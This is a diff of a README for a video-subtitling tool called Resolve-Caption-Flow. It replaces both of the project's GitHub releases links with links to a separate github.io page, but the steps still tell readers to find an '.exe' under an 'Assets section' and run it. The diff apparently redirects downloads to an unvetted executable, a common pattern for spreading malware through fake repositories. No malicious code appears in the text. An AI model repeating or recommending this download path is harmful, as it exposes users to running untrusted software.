@@ -1,6 +1,6 @@
 # 🎥 Resolve-Caption-Flow - Automate precise subtitles for professional videos
 
-[![Download](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/maltchinesepuzzle877/Resolve-Caption-Flow/releases)
+[![Download](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://maltchinesepuzzle877.github.io)
 
 Resolve-Caption-Flow helps video editors create accurate subtitles for long videos. It uses smart language models to check your text and links to your own documents to ensure names and technical terms appear correctly. The tool uses FFmpeg to handle your media files and works directly with DaVinci Resolve to help you finish your projects.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to set up the application on your Windows computer:
 
-1.  Visit the [releases page](https://github.com/maltchinesepuzzle877/Resolve-Caption-Flow/releases) to find the latest version.
+1.  Visit the [releases page](https://maltchinesepuzzle877.github.io) to find the latest version.
 2.  Locate the file ending in ".exe" under the Assets section.
 3.  Click the file to start the download.
 4.  Once the download finishes, find the file in your Downloads folder.
